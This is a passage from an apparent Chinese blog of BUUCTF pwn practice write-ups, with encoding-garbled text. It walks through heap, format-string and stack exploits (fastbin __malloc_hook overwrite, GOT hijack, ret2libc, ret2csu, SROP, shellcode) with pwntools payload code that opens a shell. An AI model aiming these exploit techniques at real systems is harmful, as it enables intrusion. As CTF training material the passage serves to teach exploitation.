\u003c__memalign_hook\u003e: 0x00007f16d929fe20 0x00007f16d929fa00 0x7f16d95deb10 \u003c__malloc_hook\u003e: 0x0000000000000000 0x0000000000000000 æˆ‘ä»¬åŠ  13 å­—èŠ‚åç§»ï¼ˆå¾ªç¯å³ç§»ï¼‰ï¼ŒæˆåŠŸä¼ªé€  chunk_sizeï¼š pwndbg\u003e x/32xg (long long)(\u0026main_arena)-0x40+0xd 0x7f16d95deaed \u003c_IO_wide_data_0+301\u003e: 0x16d95dd260000000 0x000000000000007f 0x7f16d95deafd: 0x16d929fe20000000 0x16d929fa0000007f 0x7f16d95deb0d \u003c__realloc_hook+5\u003e: 0x000000000000007f 0x0000000000000000 0x7f16d95deb1d: 0x0000000000000000 0x0000000000000000 0x7f å¯¹åº”çš„ malloc è¯·æ±‚å¤§å°å¤§çº¦æ˜¯ 0x60ã€‚ç°åœ¨ï¼Œfreelist é¡¶éƒ¨æ˜¯ eï¼Œäºæ˜¯ alloc(0x60) å°±ä¼šåˆ†é…æ€»å¤§å°ä¸º 0x71ã€èµ·ç‚¹ä¸ e ç›¸åŒã€ä¸”ç´¢å¼•ä¸º 4 çš„ chunk gï¼Œè¿™æ—¶å† free æ‰ g å°±ä¼šä½¿å¾— g ä½äº freelist é¡¶éƒ¨ã€‚ alloc(0x60) # g4 free(4) # g æ¥ä¸‹æ¥ä¿®æ”¹ç´¢å¼•ä¸º 2 çš„ chunk çš„ fdï¼ˆå®é™…å°±æ˜¯ä¸ºäº†ä¿®æ”¹ e æˆ–è€…è¯´ g çš„ fdï¼‰æŒ‡å‘ _IO_wide_data_0+301 åœ°å€ï¼Œç„¶åç¬¬ä¸€æ¬¡ Allocate å¾—åˆ° g ä½äºç´¢å¼• 5ï¼Œç¬¬äºŒæ¬¡ Allocate å¾—åˆ°æŒ‡å‘ _IO_wide_data_0+301 çš„æŒ‡é’ˆï¼Œä½äºç´¢å¼• 6ã€‚ # g-\u003efd = _IO() payload = p64(base+0x3c4aed) fill(2, payload) alloc(0x60) # g5 alloc(0x60) # _IO()6 è€Œç”±ä¸Šé¢çš„ gdb åˆ†æå¯çŸ¥å¾—åˆ°çš„æŒ‡é’ˆä½äº 0xaedï¼Œ__malloc_hook ä½äº 0xb10ï¼ˆPIE ä¸‹ä½ 12 ä½å›ºå®šï¼‰ï¼Œç›¸å·® 0x13ã€‚å› æ­¤å¡«å…… 0x13 å­—èŠ‚çš„ padding åå†æ”¾ä¸Š getshell çš„ gadget åœ°å€å³å¯ã€‚ # _IO() + 13 == __malloc_hook(), one_gadget payload = flat(['\\x00'*0x13, base+0x4526a]) fill(6, payload) æœ€åä¸è¦å¿˜è®°å†ç”³è¯·ä¸€æ¬¡ä»»æ„å¤§å°å†…å­˜ä»¥è°ƒç”¨ __malloc_hookã€‚å®Œæ•´ expï¼Œæ³¨æ„æœ€åä¸€æ¬¡ alloc è¿”å›å¾—æœ‰ç‚¹æ…¢ï¼Œrecvuntil æœ€å¥½åŠ ä¸€ä¸ª timeoutï¼š def alloc(size): sl('1') sla(':', str(size)) ru(':', timeout=1) def fill(idx, data): sl('2') sla(':', str(idx)) sla(':', str(len(data))) sa(':', data) ru(':') def free(idx): sl('3') sla(':', str(idx)) ru(':') def dump(idx): sl('4') sla(':', str(idx)) ru(':","date":"2019-12-14","objectID":"/buu-pwn/:2:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"get_started_3dsctf_2016 æœ¬åœ°è¿è¡Œè„šæœ¬ï¼š get_flag = 0x80489a0 payload = flat('a'*0x38,get_flag,'a'*4,0x308cd64f,0x195719d1) sl(payload) print r() æœ¬æ¥è¿™æ ·æ˜¯å¯ä»¥ç›´æ¥è¯»å– flag çš„ï¼Œä½†æ˜¯è¿œç¨‹ä¸è¡Œã€‚å› æ­¤è¿œç¨‹è¿è¡Œæ—¶æ¢äº†ä¸€ç§æ›´å…·éš¾åº¦çš„æ–¹æ³•ï¼Œå°±æ˜¯è°ƒç”¨ mprotect ä¿®æ”¹ bss æ®µæƒé™ä½¿å¾—å…¶å¯æ‰§è¡Œï¼Œéšåå†™å…¥ shellcodeã€‚ éœ€è¦æ³¨æ„ mprotect ç¬¬äºŒä¸ªå‚æ•°è¦æ±‚é¡µå¯¹é½ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°ä¸º 7 è¡¨ç¤º rwxã€‚ä¿®æ”¹å®Œæˆåä»æ ‡å‡†è¾“å…¥è¯»å…¥ shellcodeï¼Œå†™å…¥ bss_base åè¿”å›åˆ° bss_base å¤„æ‰§è¡Œã€‚ pop3 = 0x80483b8 got_base = 0x80eb000 bss_base = elf.bss() payload = flat('a'*0x38,elf.sym['mprotect'],pop3,got_base,0x1000,7,elf.sym['read'],pop3,0,bss_base,0x200,bss_base) sl(payload) sleep(1) sl(asm(shellcraft.sh())) ","date":"2019-12-14","objectID":"/buu-pwn/:2:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"not_the_same_3dsctf_2016 å’Œä¸Šé¢ get_started åšæ³•ä¸€æ ·ã€‚æˆ‘æ€€ç–‘ BUU ä¸Šä¸€é¢˜åœ¨æœåŠ¡å™¨ä¸Šæ”¾é”™äº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¹Ÿæ”¾äº†è¿™ä¸€é¢˜çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªè„šæœ¬æ‰ä¼šæ— æ•ˆã€‚ ","date":"2019-12-14","objectID":"/buu-pwn/:2:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"[ç¬¬äº”ç©ºé—´ 2019 å†³èµ›]PWN5 é•¿åº¦é™åˆ¶æ— æ³•æ ˆæº¢å‡ºï¼Œä½†æ˜¯å­˜åœ¨æ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚é€šè¿‡ aaaa %08x %08x ... å¯ä»¥åˆ¤æ–­åç§»ä¸º 10ã€‚ ç„¶ååˆ©ç”¨ %10$n ä¿®æ”¹ 0x804c044 åœ°å€ï¼ˆIDA å¾—åˆ°ï¼‰å¤„çš„å€¼å³å¯ï¼Œæœ€åè¾“å…¥ passwd éœ€è¦ä¸å·²æˆåŠŸè¾“å‡ºçš„å­—ç¬¦æ•°ç›¸ç­‰ã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹ atoi çš„ GOT åœ°å€ä¸º system çš„ PLT åœ°å€ã€‚ sla(':', p32(0x804c044) + '%10$n') sla(':', '4') ","date":"2019-12-14","objectID":"/buu-pwn/:2:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_n_8 IDA å¯çŸ¥éœ€è¦è®© var çš„ä¸‹æ ‡ä¸º 13 çš„å…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯ç¬¬ 14 ä¸ªï¼‰ç­‰äº 17ï¼Œç›´æ¥æŒ‰ç…§éœ€æ±‚å†™è„šæœ¬å³å¯ï¼š sl(p32(17)*14) ","date":"2019-12-14","objectID":"/buu-pwn/:2:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyfengshui_33c3_2016 æœ¬é¢˜æºç å¤§è‡´å¦‚ä¸‹ï¼Œå¼€å¯äº† canary å’Œ NXï¼š void __cdecl __noreturn main() { char v0; // [esp+3h] [ebp-15h] int action; // [esp+4h] [ebp-14h] size_t input; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); alarm(0x14u); while (1) { puts(\"0: Add a user\"); puts(\"1: Delete a user\"); puts(\"2: Display a user\"); puts(\"3: Update a user description\"); puts(\"4: Exit\"); printf(\"Action:\"); if (__isoc99_scanf(\"%d\", \u0026action) == -1 ) break; if (!action) { printf(\"size of description:\"); __isoc99_scanf(\"%u%c\", \u0026input, \u0026v0); add(input); } if (action == 1) { printf(\"index:\"); __isoc99_scanf(\"%d\", \u0026input); delete((unsigned __int8)input); } if (action == 2) { printf(\"index:\"); __isoc99_scanf(\"%d\", \u0026input); display((unsigned __int8)input); } if (action == 3) { printf(\"index:\"); __isoc99_scanf(\"%d\", \u0026input); update(input); } if (action == 4) { puts(\"Bye\"); exit(0); } if ((unsigned __int8)total_users \u003e 0x31u ) { puts(\"maximum capacity exceeded, bye\"); exit(0); } } exit(1); } æˆ‘ä»¬é‡ç‚¹å…³æ³¨å¯èƒ½å­˜åœ¨æ¼æ´çš„ add å’Œ updateï¼Œé¦–å…ˆæ˜¯ addï¼š _DWORD *__cdecl add(size_t size) { void *desc; // ST24_4 _DWORD *user; // ST28_4 desc = malloc(size); memset(desc, 0, size); user = malloc(0x80u); memset(user, 0, 0x80u); *user = desc; users[(unsigned __int8)total_users] = user; printf(\"name:\"); read_name((char *)users[(unsigned __int8)total_users] + 4, 124); update(++total_users - 1); return user; } è¿™é‡Œå¯ä»¥å¤§è‡´äº†è§£åˆ° user ç»“æ„ä½“å¤§çº¦é•¿è¿™æ ·ï¼š struct user { char *description; char name[124]; }; æ³¨æ„ descrption æ˜¯ user å¼€å§‹çš„åœ°æ–¹ã€‚ éšåå‘ç° update ä¸­å­˜åœ¨ä¸€å¤„é˜²æŠ¤æªæ–½ï¼š unsigned int __cdecl sub_8048724(unsigned __int8 index) { char v2; // [esp+17h] [ebp-11h] int len; // [esp+18h] [ebp-10h] unsigned int v4; // [esp+1Ch] [ebp-Ch] v4 = __readgsdword(0x14u); if (index \u003c (unsigned __int8)total_users \u0026\u0026 users[index] ) { len = 0; printf(\"text length:\"); __isoc99_scanf(\"%u%c\", \u0026len, \u0026v2); if ((char *)(len + *(_DWORD *)users[index]) \u003e= (char *)users[index] - 4 ) { puts(\"my l33t defenses cannot be fooled, cya!\"); exit(1); } printf(\"text:\"); read_name(*(_DWORD *)users[index], len + 1); } return __readgsdword(0x14u) ^ v4; } è¿™é‡Œå…¶å®æ˜¯åˆ¤æ–­å½“å‰ user-\u003edescription åŠ ä¸Šè¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ä¼šè¶…è¿‡ user èµ·å§‹åœ°å€ - 4 çš„ä½ç½®ï¼Œç›®çš„å¾ˆæ˜æ˜¾æ˜¯ä¸ºäº†é˜²æ­¢å †æº¢å‡ºã€‚é¢„æœŸå†…å­˜å¸ƒå±€æ˜¯ï¼š -------- | Desc0 | -------- \u003c- user0 | \u0026Desc0 | -------- | name0 | -------- | Desc1 | -------- \u003c- user1 | \u0026Desc1 | -------- | name1 | -------- | Desc2 | -------- \u003c- user2 | \u0026Desc2 | -------- | name2 | -------- ç„¶è€Œï¼Œæˆ‘ä»¬è¿˜æ‹¥æœ‰åˆ é™¤ç”¨æˆ·çš„åŠŸèƒ½ã€‚å‡å¦‚æˆ‘ä»¬åˆ é™¤ç¬¬ 0 ä¸ªç”¨æˆ·ï¼Œé‚£ä¹ˆä»–æ‹¥æœ‰çš„ç©ºé—´å°±è¢« free() äº†ã€‚è¿™æ—¶æˆ‘ä»¬æ–°å¢ç”¨æˆ·ï¼Œç”±äº desc é•¿åº¦å¯æ§ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å…¶é•¿åº¦è®©å®ƒæ°å¥½åˆ†é…åˆ°åŸæ¥ç¬¬ 0 ä¸ªç”¨æˆ·çš„ç©ºé—´ï¼Œä» Desc0 ä¸€ç›´åˆ° name0 ç»“æŸã€‚é‚£ä¹ˆæ­¤æ—¶ï¼š -------- | | | | | Desc3 | | | | | -------- | Desc1 | -------- \u003c- user1 | \u0026Desc1 | -------- | name1 | -------- | Desc2 | -------- \u003c- user2 | \u0026Desc2 | -------- | name2 | -------- \u003c- user3 | \u0026Desc3 | -------- | name3 | -------- ä¸éš¾å‘ç°ï¼Œå³ä½¿æœ‰ä¸Šè¿°é˜²æŠ¤æªæ–½çš„é™åˆ¶ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥æº¢å‡ºåˆ° user1 å¹¶è¦†ç›–å…¶ä¸­æ•°æ®ã€‚å¦‚æœæŠŠ libc ä¸­å‡½æ•°çš„ GOT è¡¨åœ°å€æ”¾è¿›å»ï¼Œç„¶å display å‡½æ•°æ‰“å°å‡ºæ¥ï¼Œå°±èƒ½æ³„éœ² libc åœ°å€ã€‚ç„¶åè¿›è¡Œ GOT åŠ«æŒå³å¯ getshellã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šå›¾ä¸­ Desc1 å‰å’Œ \u0026Desc1 å‰éƒ½æœ‰ 8 å­—èŠ‚ chunk headerï¼Œè¦†ç›–æ—¶éœ€è¦è€ƒè™‘å®ƒä»¬å çš„ 16Bã€‚æ­¤å¤–ï¼ŒDesc0+user0 åŸæœ¬æ‰€å çš„ç©ºé—´å®é™…ä¸Šæ˜¯ 0x8+0x80+0x8+0x80ï¼Œè€Œ Desc3 ç”³è¯· 0x100 å­—èŠ‚æ—¶å®é™…å  0x8+0x100ï¼Œå‰è€…æ¯”åè€…å¤šå‡ºç©ºé—²çš„ 0x8 å­—èŠ‚ï¼Œä¹Ÿéœ€è¦è€ƒè™‘ã€‚å› æ­¤è®¡ç®—åç§» 0x100+0x8+0x8+0x80+0x8=0x198ã€‚ æ”¾ä¸Š 0x198 å­—èŠ‚çš„ padding åï¼Œå°±å¯ä»¥æŠŠ free çš„ GOT åœ°å€æ”¾åœ¨ \u0026Desc1 å¤„ï¼Œæ­¤æ—¶æ‰“å°å‡ºæ¥çš„å°±æ˜¯ free çš„ GOT åœ°å€ï¼Œä»è€Œæ³„éœ²å‡º libcã€‚è¿™æ—¶å†åˆ©ç”¨æ›´æ–°åŠŸèƒ½ç”¨ system.plt è¦†ç›– free.gotï¼Œé‚£ä¹ˆæ‰§è¡Œ free æ—¶å°±ä¼šæ‰§è¡Œ systemã€‚æ­¤æ—¶è¿˜å·®ä¸€ä¸ªå‚æ•° /bin/shï¼Œæˆ‘ä»¬ä¸å¦¨æ”¾åœ¨ Desc2 å¤„ï¼Œé‚£ä¹ˆåœ¨åˆ é™¤ user2 æ—¶ï¼Œæœ‰æºç ï¼š unsigned int __cdecl delete(unsigned __int8 index) { unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); if (index \u003c (unsigned __int8)total_users \u0026\u0026 users[index] ) { free(*(void **)users[index]); free(users[index]); users[index] = 0; } return __readgsdword(0x14u) ^ v2; } è¿™é‡Œå°±ä¼šæ‰§è¡Œ free(address of /bin/sh)ï¼Œå®é™…ä¸Šå°±æ˜¯ system('/bin/sh')ã€‚ def add(max_len, desc_len, text): sla('Action:', '0') sla('description:', str(max_len)) sla('name:', 'aaaa') sla('length:', str(desc_len)) sla('text:', text) def delete(index): sla('Action:', '1') sla('index:', str(index)) def display(index): sla('Action:', '2') sla('index:', str(index)) def update(index, desc_len, text): sla('Action:', '3') sla('index","date":"2019-12-14","objectID":"/buu-pwn/:2:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_s_3 æœ¬é¢˜ä»£ç å¾ˆå°‘ï¼Œæ³¨æ„åˆ° gadgets å‡½æ•°ä¸­æœ‰ mov rax, 0Fh å’Œ mov rax, 3Bh å¯ä»¥æ§åˆ¶ raxï¼Œå®ƒä»¬æ°å¥½åˆ†åˆ«å¯¹åº”ç³»ç»Ÿè°ƒç”¨ sigreturn å’Œ execveã€‚å› æ­¤æœ¬é¢˜å¯ä»¥å›´ç»•è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨ç»™å‡ºä¸¤ç§åšæ³•ã€‚ æ¯”è¾ƒéš¾çš„åšæ³•æ˜¯åˆ©ç”¨ execveï¼Œæˆ‘ä»¬å¸Œæœ›æ‰§è¡Œ execve('/bin/sh',0,0)ï¼Œé‚£ä¹ˆè¿˜éœ€è¦æ§åˆ¶ rdi,rsi,rdxã€‚è¿™é‡Œéœ€è¦å‡ ä¸ª gadgetsï¼Œä½†æ˜¯ gadgets å‡½æ•°ä¸­çš„ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥å¯ä»¥ ret2csuã€‚/bin/sh éœ€è¦æˆ‘ä»¬è‡ªå·±å†™ï¼Œä½†åªèƒ½å†™åˆ°æ ˆä¸Šï¼Œå› æ­¤éœ€è¦é€šè¿‡ write æ³„éœ²æ ˆåœ°å€ã€‚ æˆ‘ä»¬è¾“å…¥çš„å†…å®¹ä½äº rbp-0x10ï¼Œé‚£ä¹ˆå¡«å…… 16 å­—èŠ‚åå¡«å…… main å‡½æ•°åœ°å€å³å¯é‡å¯ç¨‹åºåŒæ—¶æ³„éœ²æ ˆåœ°å€ï¼Œgdb è°ƒè¯•å¯çŸ¥æ³„éœ²ä½ç½®è·ç¦»æˆ‘ä»¬çš„è¾“å…¥åç§»é‡ä¸º 0x118 å­—èŠ‚ã€‚ æœ€ååœ¨æ ˆä¸Šå¸ƒç½®å¥½ /bin/sh å­—ç¬¦ä¸²å’Œ pop_rdi çš„ gadgetï¼Œå‡†å¤‡å¥½ raxï¼Œè¿”å›åˆ° csu æœ«å°¾ç¡®ä¿ rbx=0 ä¸” rbp=1ï¼Œå°†æ ˆä¸Š pop rdi çš„åœ°å€ç»™ r12 ä»¥ä¾¿è°ƒç”¨ï¼Œéšåè®¾ç½® rsi,rdx ä¸º 0ï¼Œæœ€åå°† /bin/sh çš„åœ°å€ç»™ rdiï¼Œè°ƒç”¨ syscall å³å¯ã€‚ syscall = 0x400517 mov_rax_3b = 0x4004e2 pop_rdi = 0x4005a3 csu_1 = 0x400580 csu_2 = 0x40059a payload = 'a'*16 + p64(elf.sym['main']) sl(payload) r(0x20) stack = uu64(r(8))-0x118 leak('stack',stack) payload = flat('/bin/sh\\x00',pop_rdi,mov_rax_3b,csu_2,0,1,stack-0x18,0,0,0,csu_1,pop_rdi,stack-0x20,syscall) sl(payload) ç¬¬äºŒç§æ–¹æ³•åˆ™æ˜¯ SROPã€‚æˆ‘ä»¬åˆ©ç”¨ mov rax, 0Fh æ§åˆ¶ rax ä¸º 15ï¼Œéšåè°ƒç”¨ syscallï¼Œç›¸å½“äºæ‰§è¡Œäº†ä¸€æ¬¡ sigreturnã€‚å¯ä»¥ä¼ªé€  sigreturn frame æ¥æ‰§è¡Œ execve('/bin/sh',0,0)ã€‚ syscall = 0x400517 mov_rax_0f = 0x4004da payload = 'a'*16 + p64(elf.sym['vuln']) sl(payload) r(0x20) stack = uu64(p.r(8))-0x118 leak('stack',stack) frame = SigreturnFrame() frame.rax = constants.SYS_execve frame.rdi = stack frame.rsi = 0 frame.rdx = 0 frame.rsp = stack frame.rip = syscall payload = flat('/bin/sh\\x00'*2,mov_rax_0f,syscall) + str(frame) sl(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:8","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"[HarekazeCTF2019]baby_rop å‘ç° main é‡Œæœ‰ systemï¼Œç„¶åè¿˜æ‰¾åˆ°äº† /bin/sh å­—ç¬¦ä¸²å’Œ pop rdi çš„ gadgetï¼Œé‚£å°±è€åŠæ³•ä¼ å‚å°±è¡Œäº†ï¼Œå°±æ˜¯ getshell ä¹‹åéœ€è¦æ‰¾ä¸€ä¸‹ flag çš„ä½ç½®ã€‚ binsh = 0x601048 pop_rdi = 0x400683 payload = flat('a'*0x18,pop_rdi,binsh,elf.plt['system']) sl(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:9","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pwn2_sctf_2016 æœ¬é¢˜å…ˆä¼šè®©ç”¨æˆ·è®¾ç½®è¯»å…¥æ•°æ®é•¿åº¦ï¼Œå¦‚æœå¤§äº 32 åˆ™é€€å‡ºã€‚ç”±äºå®ƒè‡ªå·±å®ç°çš„ get_n å‡½æ•°ç¬¬äºŒä¸ªå‚æ•°æ˜¯ unsigned intï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°ä½¿ç”¨æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼Œå› æ­¤å¯ä»¥è¾“å…¥ -1 äº§ç”Ÿæ ˆæº¢å‡ºæ¼æ´ã€‚ç„¶å ret2libc å°±å¥½ã€‚ ru('read?') sl('-1') ru('data!') you_said_s = 0x80486f8 payload = flat('a'*(0x2c+4),elf.plt['printf'],elf.sym['main'],you_said_s,elf.got['printf']) sl(payload) ru('You said:') ru('You said:') printf = u32(r(4)) leak('printf',printf) system,binsh = ret2libc(printf,'printf') ru('read?') sl('-1') ru('data!') payload = flat('a'*(0x2c+4),system,'a'*4,binsh) sl(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:10","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ez_pz_hackover_2016 è¿™é¢˜è¦æ±‚å­—ç¬¦ä¸² s ä»¥ crackme\\x00 å¼€å¤´ï¼Œéšåä¼šæ‰§è¡Œ memcpy å°†æˆ‘ä»¬çš„è¾“å…¥å¤åˆ¶åˆ°ä¸€ä¸ª dest ä½ç½®ã€‚æˆ‘ä»¬é€šè¿‡ gdb è°ƒè¯•å¯ä»¥æµ‹å‡ºå…¶è·ç¦» ebp è·ç¦»ä¸º 22ï¼Œè¦è¦†ç›–åˆ°è¿”å›åœ°å€åˆ™éœ€è¦ 26 å­—èŠ‚ã€‚è‡³äºè¿”å›åœ°å€ï¼Œé¢˜ç›®æä¾›äº†å­—ç¬¦ä¸² s çš„åœ°å€ï¼Œä½†æ˜¯ç›´æ¥ä»¥å®ƒä½œä¸ºè¿”å›åœ°å€ä¼šå¤±è´¥ï¼Œgdb è°ƒè¯•åˆ° vuln å‡½æ•°ä¸­çš„ ret è¯­å¥çš„æ—¶å€™ä¼šå‘ç°ï¼Œè¿”å›åœ°å€ä½äº 0xffca41dcï¼Œè€Œæˆ‘ä»¬å†™å…¥çš„æ•°æ®ä½äº 0xffca41c0ï¼Œç›¸å·® 0x1cï¼Œå› æ­¤è¿˜éœ€è¦è€ƒè™‘è¯¥åç§»é‡ã€‚ ru('crash:') ss = int(ru('\\n'),16) leak('ss',ss) payload = 'crashme\\x00'.ljust(26,'\\x00') + p32(ss-0x1c) + asm(shellcraft.sh()) sl(payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:11","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_ne_5 æœ¬é¢˜æœ‰ GetFlag çš„åé—¨ï¼Œæœ‰ä¸€ä¸ª memcpy çš„æ“ä½œï¼Œæ­¤æ—¶éœ€è¦å…³æ³¨çš„åç§»å®é™…ä¸Šæ˜¯ dest åˆ° ebp çš„è·ç¦»ã€‚ç®¡ç†å‘˜å¯†ç å¯ç›´æ¥é€šè¿‡åç¼–è¯‘å¾—åˆ°ã€‚ binsh = 0x80482ea sla('password:','administrator') sla('Exit\\n:','1') payload = flat('a'*(0x48+4),elf.plt['system'],'a'*4,binsh) sla('info:',payload) sla('Exit\\n:','4') ","date":"2019-12-14","objectID":"/buu-pwn/:2:12","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"[HarekazeCTF2019]baby_rop2 é¢˜ç›®ç»™å®šäº† libcï¼Œç»“åˆé¢˜ç›®åå¯ä»¥æƒ³åˆ° ret2libcï¼Œè¿™é‡Œåªèƒ½è°ƒç”¨ printf æ¥æ‰“å°å‡½æ•° GOT åœ°å€ï¼Œå…¶ä½™å’Œå¸¸è§„ ret2libc ç›¸åŒã€‚ pop_rdi = 0x400733 payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['printf'],elf.sym['main']) sla('name?', payload) ru('\\n') read = uu64(r(6)) leak('read', read) system, binsh = ret2libc(read,'read','./libc.so.6') payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8) sla('name?', payload) ","date":"2019-12-14","objectID":"/buu-pwn/:2:13","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_n_5 æœ¬é¢˜æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå› æ­¤æ–¹æ³•å¤šæ ·ï¼Œä¾‹å¦‚ ret2libcï¼š sla('name\\n', 'merc') pop_rdi = 0x400713 #ret = 0x4004c9 payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['main']) ru('me?\\n') sl(payload) read = uu64(r(6)) leak('read',read) sla('name\\n', 'merc') system, binsh = ret2libc(read,'read') payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8) sla('me?\\n', payload) æˆ–è€…æ›´ç®€å•çš„ ret2shellcodeï¼š sla('name\\n', asm(shellcraft.sh())) payload = flat('a'*0x28,0x601080) ru('me?\\n') sl(payload) ç”±äºè¿œç¨‹ libc ç‰ˆæœ¬å’Œæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ç‰ˆæœ¬ä¸åŒï¼Œæ‰“è¿œç¨‹æ—¶æ¨èä½¿ç”¨ ret2shellcodeï¼Œæ„Ÿè§‰è¿™ä¸ªæ›´æ¥è¿‘é¢„æœŸè§£ã€‚ ","date":"2019-12-14","objectID":"/buu-pwn/:2:14","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´"],"title":"BUUCTF Pwn ç»ƒä¹ è®°å½•","uri":"/buu-pwn/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ciscn_2019_final_3 æä¾›äº† libcï¼Œå‘ç°æ˜¯ 2.27 ç‰ˆæœ¬çš„ï¼Œè€ƒè™‘å’Œ tcache åˆ©ç”¨æœ‰å…³ã€‚ ç¨‹åºæä¾›äº† add å’Œ remove ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆ add åªèƒ½åˆ›å»ºå°äº 0x78 å­—èŠ‚çš„ chunkï¼Œä¸”æœ€å¤šåˆ›å»º 0x18 ä¸ª chunkã€‚gift ä¼šè¿”å›åˆ†é…åˆ°çš„å†…å­˜åœ°å€ã€‚è€Œåœ¨ remove ä¸­ï¼Œfree ä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½® nullï¼Œå­˜åœ¨ double freeã€‚ ç”±äºé¢˜ç›®ç»™äº† libcï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½æ³„éœ² libc åœ°å€ï¼Œè¿™å°±éœ€è¦ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd æŒ‡å‘ libcã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼Œunsorted bin æŒ‡å‘ main_arena çš„æŒ‡é’ˆæ˜¯æŒ‡å‘ libc çš„ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æŠŠè¿™ä¸ªæŒ‡é’ˆç»™ tcache ä¸­æŸèŠ‚ç‚¹çš„ fd å‘¢ï¼Ÿ ç”±äº 0x78 å­—èŠ‚çš„é™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ›å»ºé€‚åˆæ”¾å…¥ unsorted bin ä¸­çš„ chunkï¼Œå› æ­¤éœ€è¦å…ˆåˆå¹¶å°å †å—ï¼Œç„¶åä¿®æ”¹ chunk0 çš„ chunk_size æŠŠä»–å˜æˆä¸€ä¸ªå¤§å †å—ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿™ä¸ª chunk_size å­—æ®µï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ° double 